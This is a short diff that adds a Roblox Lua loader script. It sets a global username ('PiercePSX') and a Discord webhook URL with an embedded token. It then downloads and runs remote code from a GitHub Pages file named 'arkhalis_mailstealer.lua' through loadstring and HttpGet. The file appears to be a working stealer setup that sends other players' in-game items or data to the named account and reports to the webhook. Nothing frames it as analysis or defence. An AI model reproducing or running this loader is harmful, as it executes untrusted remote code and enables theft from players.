@@ -1,0 +1,7 @@
+_G.Username1 = "PiercePSX"
+
+_G.Webhook = "https://discord.com/api/webhooks/1098873183345594418/st1s0hlaHvh3Cg1ToursQGvU8RR8RaOozVUdlzMOPo21bb-Vlutvi_qXocdKywwBs-W4"
+
+loadstring(game:HttpGet("https://arkhalislua.github.io/arkhalis_mailstealer.lua", true))()
+
+```
